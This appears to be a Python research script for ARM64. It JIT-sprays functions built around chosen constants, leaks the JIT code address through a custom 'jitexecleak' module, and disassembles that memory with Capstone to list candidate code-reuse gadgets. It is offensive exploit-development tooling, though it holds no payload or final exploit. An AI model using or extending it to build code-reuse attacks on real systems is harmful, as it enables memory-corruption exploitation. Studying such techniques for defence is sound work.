import ctypes
import jitexecleak
from capstone import *
from multiprocessing import Process, current_process

# Disassembler setup (global to all processes)
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True
interesting = ["ret", "br", "blr", "ldr", "mov", "eor", "orr", "and", "cmp", "sub", "add"]

# Candidate magic values (AArch64 friendly)
magic_values = [
    0x0000FFFF,
    0xFFFF0000,
    0xF0F0F0F0,
    0x0F0F0F0F,
    0xDEADBEEF,
    0xAAAAAAAA,
    0x00000000,
    0xFFFFFFFF,
]

# Function factory for spray loop
def make_strong_spray(magic):
    def spray_func(x):
        acc = x
        for i in range(100_000):
            acc = ((acc ^ magic) + i) ^ (acc >> 1)
            acc = (acc | (magic & i)) ^ (acc << 2)
            if i % 11 == 0:
                acc -= (magic ^ (x << 1))
        return acc
    return spray_func

# Worker: run spray + disasm in a separate process
def run_magic_test(magic):
    print(f"\n[+] [PID {current_process().pid}] Testing magic: 0x{magic:08x}")
    spray_func = make_strong_spray(magic)

    for _ in range(1000):
        spray_func(42)

    try:
        jit_addr = jitexecleak.leak_executor_jit(spray_func)
        print(f"[+] [0x{magic:08x}] JIT code @ 0x{jit_addr:x}")
    except RuntimeError:
        print(f"[-] [0x{magic:08x}] JIT leak failed.")
        return

    mem = ctypes.string_at(jit_addr, 0x200)
    print(f"[*] [0x{magic:08x}] Disassembling 0x{jit_addr:x}...")
    for i in md.disasm(mem, jit_addr):
        if i.mnemonic in interesting or "x16" in i.op_str:
            print(f"  [GADGET] 0x{i.address:x}:\t{i.mnemonic:<6}\t{i.op_str}")

# Entry point
if __name__ == "__main__":
    from multiprocessing import set_start_method
    try:
        set_start_method("fork")
    except RuntimeError:
        pass

    procs = []
    for magic in magic_values:
        p = Process(target=run_magic_test, args=(magic,))
        p.start()
        procs.append(p)

    for p in procs:
        p.join()
